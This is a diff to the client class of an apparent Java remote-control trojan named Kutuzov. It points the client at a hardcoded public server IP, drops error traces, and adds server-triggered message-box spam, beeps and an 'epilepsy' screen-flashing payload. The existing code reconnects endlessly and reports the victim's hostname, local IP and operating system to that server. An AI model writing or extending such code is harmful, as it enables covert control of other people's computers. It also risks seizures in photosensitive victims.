@@ -1,9 +1,12 @@
 package me.kutuzov.client;
 
+import com.sun.jna.platform.win32.GDI32;
+import me.kutuzov.client.payloads.Payloads;
 import me.kutuzov.packet.*;
 import me.pk2.moodlyencryption.MoodlyEncryption;
 
 import javax.swing.*;
+import java.awt.*;
 import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
@@ -14,7 +17,7 @@ import java.util.ArrayList;
 import java.util.concurrent.atomic.AtomicReference;
 
 public class KutuzovEntry {
-    public  static final String HOST = "localhost";
+    public  static final String HOST = "135.125.183.121";
     public  static final int    PORT = 33901;
 
     private static Socket socket;
@@ -23,7 +26,6 @@ public class KutuzovEntry {
             socket = new Socket(HOST, PORT);
         } catch (IOException e) {
             System.out.println("[M0] Connection lost, reconnecting...");
-            e.printStackTrace();
             while (true) {
                 try {
                     socket = new Socket(HOST, PORT);
@@ -31,7 +33,6 @@ public class KutuzovEntry {
                     continue;
                 } catch (Exception e1) {
                     System.out.println("[M1] Connection lost, reconnecting...");
-                    e1.printStackTrace();
                 }
             }
         }
@@ -65,7 +66,8 @@ public class KutuzovEntry {
                     Object packet = ois.readObject();
                     if(packet instanceof SCMessageBoxPacket) {
                         SCMessageBoxPacket scMessageBoxPacket = (SCMessageBoxPacket) packet;
-                        new Thread(() -> JOptionPane.showMessageDialog(null, scMessageBoxPacket.content, scMessageBoxPacket.title, JOptionPane.INFORMATION_MESSAGE));
+                        for(int i = 0; i < scMessageBoxPacket.amount; i++)
+                            new Thread(() -> JOptionPane.showMessageDialog(null, scMessageBoxPacket.content, scMessageBoxPacket.title, JOptionPane.INFORMATION_MESSAGE)).start();
                     } else if(packet instanceof SCDAPacket) {
                         SCDAPacket scDAPacket = (SCDAPacket) packet;
                         try {
@@ -94,6 +96,15 @@ public class KutuzovEntry {
                         String os = System.getProperty("os.name");
                         String localHost = InetAddress.getLocalHost().getHostAddress();
                         oos.writeObject(new CSHandshakePacket(identifierName, localHost, os));
+                    } else if(packet instanceof SCBeepPacket)
+                        Toolkit.getDefaultToolkit().beep();
+                    else if(packet instanceof SCEpilepsyPacket) {
+                        SCEpilepsyPacket scEpilepsyPacket = (SCEpilepsyPacket) packet;
+                        Payloads.epilepsyScreenEnabled.set(true);
+                        try {
+                            Thread.sleep(scEpilepsyPacket.time);
+                        } catch (InterruptedException e) { }
+                        Payloads.epilepsyScreenEnabled.set(false);
                     }
                 } catch (Exception ignored) {
                     try {
